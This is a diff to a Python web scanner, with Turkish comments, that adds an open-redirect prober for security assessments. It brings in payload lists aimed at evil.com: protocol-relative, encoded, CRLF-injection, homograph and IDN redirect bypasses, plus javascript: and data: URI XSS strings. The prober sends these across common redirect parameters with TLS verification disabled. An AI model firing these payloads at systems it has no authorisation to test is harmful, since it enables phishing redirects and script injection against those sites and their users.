@@ -97,6 +97,34 @@ _PAYLOADS = [
     f"https://{_CANARY}#",
     # Null byte
     f"https://{_CANARY}%00",
+    # Protocol-relative
+    "//evil.com",
+    "////evil.com",
+    "/\\/evil.com",
+    "\\\\evil.com",
+    # JavaScript URI
+    "javascript:alert(document.domain)",
+    "javascript://%0aalert(1)",
+    "JaVaScRiPt:alert(1)",
+    # Data URI
+    "data:text/html,<script>alert(1)</script>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    # Double encode
+    "%2F%2Fevil.com",
+    "%252F%252Fevil.com",
+    "..%2F..%2Fevil.com",
+    # Backslash tricks
+    "/\\evil.com",
+    "http:\\\\evil.com",
+    # CRLF combo
+    "evil.com%0d%0aLocation: https://evil.com",
+    # Unicode homograph
+    "https://еvil.com",  # Cyrillic 'е'
+    # IDN bypass
+    "https://xn--vil-kva.com",
+    # Meta refresh via redirect chain
+    "https://evil.com/%09",
+    "https://evil.com/%2F",
 ]
 
 def _load_redirect_payloads() -> List[str]:
@@ -196,7 +224,10 @@ class OpenRedirectScanner(BaseScanner):
     def run(self, target: str, **kwargs) -> None:
         """BaseScanner interface — delegates to scan()."""
         urls = kwargs.get("urls") or kwargs.get("endpoints") or []
-        self.scan(target, urls=urls)
+        findings = self.scan(target, urls=urls)
+        # Advanced prober — protocol-relative, JS-URI, unicode, IDN payloads
+        adv = AdvancedRedirectProber(session=self.session, results=self.results)
+        adv.run(target, **kwargs)
 
     def _probe_task(self, task: Tuple) -> Optional[Dict[str, Any]]:
         """Tek bir (test_url, param, payload, origin_url) kombinasyonunu test eder."""
@@ -318,6 +349,145 @@ class OpenRedirectScanner(BaseScanner):
 
         logger.info(f"[OpenRedirect] Tamamlandı: {len(findings)} bulgu")
         return findings
+
+
+# ---------------------------------------------------------------------------
+# AdvancedRedirectProber — protocol-relative / JS-URI / Data-URI / unicode
+# ---------------------------------------------------------------------------
+
+_ADV_PARAMS = [
+    "url", "next", "redirect", "goto", "dest", "destination",
+    "rurl", "redirect_uri", "redirect_url", "return", "returnTo",
+    "return_path", "checkout_url", "continue", "target", "view",
+]
+
+_ADV_PAYLOADS = [
+    # Protocol-relative
+    "//evil.com",
+    "////evil.com",
+    "/\\/evil.com",
+    "\\\\evil.com",
+    # JavaScript URI
+    "javascript:alert(document.domain)",
+    "javascript://%0aalert(1)",
+    "JaVaScRiPt:alert(1)",
+    # Data URI
+    "data:text/html,<script>alert(1)</script>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    # Double encode
+    "%2F%2Fevil.com",
+    "%252F%252Fevil.com",
+    "..%2F..%2Fevil.com",
+    # Backslash tricks
+    "/\\evil.com",
+    "http:\\\\evil.com",
+    # CRLF combo
+    "evil.com%0d%0aLocation: https://evil.com",
+    # Unicode homograph
+    "https://еvil.com",  # Cyrillic 'е'
+    # IDN bypass
+    "https://xn--vil-kva.com",
+    # Meta refresh via redirect chain
+    "https://evil.com/%09",
+    "https://evil.com/%2F",
+]
+
+_REDIRECT_STATUS_CODES = {301, 302, 303, 307, 308}
+
+
+class AdvancedRedirectProber(BaseScanner):
+    """
+    Protocol-relative, JavaScript URI, Data URI, unicode homograph ve IDN
+    bypass payload'larını her yaygın redirect parametresine uygular.
+
+    Severity:
+      - Location header'ında evil.com → High (Confirmed)
+      - JavaScript / Data URI payload → Critical (XSS zinciri)
+    """
+
+    name = "open_redirect_advanced"
+
+    def run(self, target: str, **kwargs) -> List[Dict[str, Any]]:
+        findings: List[Dict[str, Any]] = []
+        parsed = urlparse(target)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+
+        probe_urls = [target]
+        for path in ["/login", "/redirect", "/go", "/out", "/"]:
+            probe_urls.append(base.rstrip("/") + path)
+
+        for probe_url in probe_urls:
+            for param in _ADV_PARAMS:
+                for payload in _ADV_PAYLOADS:
+                    test_url = f"{probe_url}{'&' if '?' in probe_url else '?'}{param}={quote(payload, safe='%:/')}"
+                    finding = self._probe(test_url, param, payload)
+                    if finding:
+                        self.report_finding(**finding)
+                        findings.append(finding)
+                        logger.info(
+                            "[AdvancedRedirectProber] BULUNDU: %s param=%s payload=%r",
+                            probe_url, param, payload,
+                        )
+                        break  # per-param early exit on first hit
+        return findings
+
+    def _probe(self, test_url: str, param: str, payload: str) -> Optional[Dict[str, Any]]:
+        try:
+            resp = self.session.get(
+                test_url,
+                timeout=REQUEST_TIMEOUT,
+                allow_redirects=False,
+                verify=False,
+            )
+        except _requests.exceptions.RequestException as exc:
+            logger.debug("[AdvancedRedirectProber] Request failed: %r", exc)
+            return None
+
+        location = resp.headers.get("Location", "") or resp.headers.get("location", "")
+        status_ok = resp.status_code in _REDIRECT_STATUS_CODES
+
+        # JS / Data URI → Critical (XSS chain)
+        payload_lower = payload.lower()
+        if (payload_lower.startswith("javascript:") or payload_lower.startswith("data:")):
+            if status_ok and location:
+                return {
+                    "vuln_type": "Open Redirect (XSS Chain — JS/Data URI)",
+                    "url": test_url,
+                    "param": param,
+                    "payload": payload,
+                    "severity": "Critical",
+                    "description": (
+                        f"Redirect param '{param}' accepted a JavaScript/Data URI payload. "
+                        "This can be chained into XSS."
+                    ),
+                    "extra": {
+                        "status_code": resp.status_code,
+                        "location": location,
+                        "cwe": "CWE-601",
+                        "owasp": "A01:2021",
+                    },
+                }
+
+        # evil.com in Location → Confirmed High
+        if status_ok and location and "evil.com" in location.lower():
+            return {
+                "vuln_type": "Open Redirect (Confirmed)",
+                "url": test_url,
+                "param": param,
+                "payload": payload,
+                "severity": "High",
+                "description": (
+                    f"Redirect param '{param}' caused server to redirect to evil.com. "
+                    "Open redirect confirmed."
+                ),
+                "extra": {
+                    "status_code": resp.status_code,
+                    "location": location,
+                    "cwe": "CWE-601",
+                    "owasp": "A01:2021",
+                },
+            }
+        return None
 
 
 # ---------------------------------------------------------------------------
